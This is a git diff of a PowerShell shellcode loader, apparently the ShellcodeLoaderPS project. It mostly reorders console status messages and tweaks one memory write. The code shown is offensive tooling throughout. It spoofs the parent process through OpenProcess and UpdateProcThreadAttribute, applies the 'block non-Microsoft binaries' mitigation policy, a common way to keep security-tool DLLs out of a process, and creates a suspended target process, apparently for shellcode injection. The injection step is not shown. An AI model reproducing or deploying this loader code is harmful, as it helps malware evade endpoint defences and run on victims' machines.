@@ -34,6 +34,13 @@
 #.LINK
 # https://github.com/tylerdotrar/ShellcodeLoaderPS
 
+  <#
+    To do:
+    - Standardize constants (rename procattrflags or process creation or something)
+    - Change MICROSOFT policy implementation to use WriteInt64 instead of WriteIntPtr
+    - Do more testing regarding spoofing parent console
+  #>
+
     Param(
         [string]$CreateProcess,
         [string]$ProcessArgs,
@@ -344,7 +351,8 @@
 
     ### (1) Acquire Handle to Parent Process ###
 
-    Write-Host '[!] Acquiring handle to target parent process...' -ForegroundColor Yellow 
+    Write-Host '[!] Acquiring handle to target parent process...' -ForegroundColor Yellow
+    Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green
 
     # OpenProcess()
     #  > Description : Acquire a handle to process.
@@ -356,7 +364,6 @@
     $bInheritHandle  = $FALSE                                 # Boolean for child processes to inherit the handle.
     $dwProcessId     = $ParentProc.Id                         # Target process to be opened.
     
-    Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green
     Try   { $ParentHandle = $OpenProcess.Invoke($dwDesiredAccess, $bInheritHandle, $dwProcessId) }
     Catch { return Generic-Error }
 
@@ -368,7 +375,8 @@
 
     ### (2) Initialize Process Creation Attributes List
 
-    Write-Host '[!] Initializing process creation attribute list...' -ForegroundColor Yellow 
+    Write-Host '[!] Initializing process creation attribute list...' -ForegroundColor Yellow
+    Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
 
     # InitializeProcThreadAttributeList()
     #  > Description : Initializes the specified list of attributes for process and thread creation.
@@ -381,7 +389,6 @@
     $dwFlags          = 0               # Reserved parameter, must be 0.
     $lpSize           = [IntPtr]::Zero  # Output the required size of the lpAttributeList buffer.
     
-    Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
     Try   { $Initialized = $InitializeProcThreadAttributeList.Invoke($lpAttributeList, $dwAttributeCount, $dwFlags, [ref]$lpSize) }
     Catch { return Generic-Error }
 
@@ -392,7 +399,7 @@
     # Argument(s) (2/2)
     $StartupInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
     $StartupInfoEx.StartupInfo.cb  = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfoEx)
-    
+
     Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (2/2)'
     Try   { $Initialized = $InitializeProcThreadAttributeList.Invoke($StartupInfoEx.lpAttributeList, $dwAttributeCount, $dwFlags, [ref]$lpSize) }
     Catch { return Generic-Error }
@@ -404,7 +411,8 @@
     ### (3) Update Process Creation Attribute List ###
 
     Write-Host '[!] Updating process creation attribute list...' -ForegroundColor Yellow
-
+    Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
+    
     # UpdateProcThreadAttribute()
     #  > Description : Updates the specified attribute in a list of attributes for process and thread creation.
     #  > Location    : Kernel32.dll
@@ -421,7 +429,6 @@
 
     [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $ParentHandle)
 
-    Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
     Try   { $Updated = $UpdateProcThreadAttribute.Invoke($lpAttributeList, $dwFlags, $Attribute, $lpValue, $cbSize, $lpPreviousValue, $lpReturnSize) }
     Catch { return Generic-Error }
 
@@ -432,7 +439,7 @@
     # Argument(s) (2/2)
     $Attribute = $ProcAttrFlags.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
     $lpValue   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
-    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $ProcAttrFlags.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
+    [System.Runtime.InteropServices.Marshal]::WriteInt64($lpValue, $ProcAttrFlags.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
 
     Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (2/2)'
     Try   { $Updated = $UpdateProcThreadAttribute.Invoke($lpAttributeList, $dwFlags, $Attribute, $lpValue, $cbSize, $lpPreviousValue, $lpReturnSize) }
@@ -443,8 +450,10 @@
     
 
     ### (4) Create Target Process in a Suspended State ###
+    Start-Sleep -Seconds 3
 
     Write-Host "[!] Creating target process..." -ForegroundColor Yellow
+    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
 
     # CreateProcessA()
     #  > Description : Create a new process and its primary thread.
@@ -467,7 +476,7 @@
     $ThreadAttributes.bInheritHandle  = $TRUE
     Start-Sleep -Seconds 1
 
-    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green
+
     Try { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
     Catch { return Generic-Error }
 
